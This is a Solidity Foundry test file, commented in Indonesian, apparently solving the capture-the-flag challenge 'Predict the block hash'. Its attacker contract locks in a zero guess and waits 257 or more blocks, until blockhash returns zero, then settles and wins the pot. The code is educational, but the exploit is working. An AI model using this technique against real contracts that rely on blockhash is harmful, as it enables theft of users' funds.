// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {PredictTheBlockHashChallenge} from "src/PredictTheBlockHashChallenge.sol";

// #10 Predict the block hash — settle() menghitung jawaban dari
// blockhash(settlementBlockNumber). blockhash blok yang lebih dari
// 256 blok lama mengembalikan 0x0 (EVM: BLOCKHASH hanya berlaku
// untuk 256 blok terakhir). Kunci tebakan 0x0, tunggu 257+ blok,
// baru settle -> jawaban 0 == tebakan -> menang 2 ether.
// Beda dengan Predict the future (#5): di sana penyerang MEMILIH
// blok yang jawabannya cocok; di sini jawabannya MELURUH menjadi
// konstanta yang diketahui (0) setelah 256 blok.
contract PredictTheBlockHashAttacker {
    PredictTheBlockHashChallenge public target;

    constructor(PredictTheBlockHashChallenge _target) {
        target = _target;
    }

    function lock(bytes32 h) external payable {
        target.lockInGuess{value: 1 ether}(h);
    }

    function settle() external {
        target.settle();
    }

    receive() external payable {}
}

contract PredictTheBlockHashSolve is Test {
    PredictTheBlockHashChallenge challenge;
    PredictTheBlockHashAttacker attacker;

    function setUp() public {
        vm.deal(address(this), 10 ether);
        challenge = new PredictTheBlockHashChallenge{value: 1 ether}();
        attacker = new PredictTheBlockHashAttacker(challenge);
        vm.deal(address(attacker), 10 ether);
    }

    function testInit() public view {
        assertFalse(challenge.isComplete());
    }

    function testSolve() public {
        attacker.lock{value: 1 ether}(bytes32(0));
        // settlementBlockNumber = N+1; butuh block.number - (N+1) > 256
        // agar blockhash(N+1) == 0x0. Roll 300 blok (aman).
        vm.roll(block.number + 300);
        attacker.settle();
        assertTrue(challenge.isComplete());
    }
}
